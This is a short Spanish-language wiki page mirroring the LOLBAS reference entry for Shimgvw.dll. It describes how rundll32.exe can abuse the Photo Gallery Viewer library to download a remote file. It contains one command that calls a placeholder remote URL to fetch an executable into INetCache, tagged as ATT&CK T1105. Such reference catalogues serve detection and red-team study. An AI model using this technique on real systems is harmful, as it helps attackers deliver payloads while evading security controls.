# LOLBAS: Shimgvw.dll

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Photo Gallery Viewer

## Comandos

### Download file from remote location.

Download · priv: User · T1105

```cmd
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
```

Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.

